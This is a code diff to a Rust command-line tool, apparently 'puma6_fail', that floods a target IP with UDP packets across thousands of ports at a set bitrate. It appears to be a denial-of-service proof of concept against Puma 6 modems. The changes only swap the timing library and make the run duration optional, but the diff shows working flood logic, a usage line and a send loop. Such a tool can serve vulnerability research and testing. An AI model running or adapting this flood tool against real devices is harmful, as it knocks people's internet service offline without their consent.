@@ -3,12 +3,10 @@
 // Attacking a system without permission is illegal in most countries
 // and also not very nice
 
-extern crate time;
-
 use std::env;
 use std::net::UdpSocket;
 use std::thread;
-use std::time::Duration;
+use std::time::{Duration, Instant};
 
 use std::net::{Ipv4Addr, SocketAddrV4, Ipv6Addr, SocketAddrV6, SocketAddr};
 
@@ -18,12 +16,12 @@ fn main() {
 	let mut length = 0usize;
 	let mut mbper_second = 1f32;
 	let mut port_range = 50000;
-	let mut run_seconds = -1;
+	let mut run_seconds = None;
 	let mut ipv4 = Ipv4Addr::new(0, 0, 0, 0);
 	let mut ipv6 = Ipv6Addr::new(0, 0, 0, 0, 0, 0, 0, 0);
 	let mut is_ipv6 = false;
 
-	println!("usage: ./puma6_fail <target ip={}> <payload length={}> <mbps={}> <ports={}> <run seconds={}>", target, length, mbper_second, port_range, run_seconds);
+	println!("usage: ./puma6_fail <target ip={}> <payload length={}> <mbps={}> <ports={}> <run seconds={}>", target, length, mbper_second, port_range, "optional");
 
 	if args.len() <= 1 {
 		println!("A target IP must be given");
@@ -54,7 +52,7 @@ fn main() {
 	}
 
 	if args.len() > 5 {
-		run_seconds = args[5].as_str().parse::<i32>().expect("invalid run seconds");
+		run_seconds = Some(args[5].as_str().parse::<u32>().expect("invalid run seconds") as u128);
 	}
 
 	let socket_addr;
@@ -74,7 +72,7 @@ fn main() {
 	println!("Sending {} UDP pps, {} bytes payload, {} bytes IP, {} bytes ethernet, to {} ports at {}", pps, length, udp_length, ethernet_length, port_range, target);
 	println!("mbps IP traffic: {}, mbps ethernet traffic: {}", pps*(udp_length as f32)/(1024f32*1024f32/8f32), pps*(ethernet_length as f32)/(1024f32*1024f32/8f32));
 
-	let start = time::PreciseTime::now();
+	let start = Instant::now();
 	let mut count = 0;
 	loop {
 		for port in 10000..(10000 + port_range) {
@@ -89,8 +87,8 @@ fn main() {
 			}
 
 			count = count + 1;
-			let elapsed = start.to(time::PreciseTime::now()).num_milliseconds();
-			if run_seconds > 0 && elapsed > run_seconds as i64 * 1000i64 {
+			let elapsed = (Instant::now() - start).as_millis();
+			if run_seconds.map(|run_seconds| elapsed > run_seconds * 1000).unwrap_or(false) {
 				println!("run seconds exceeded, stopping");
 				return;
 			}
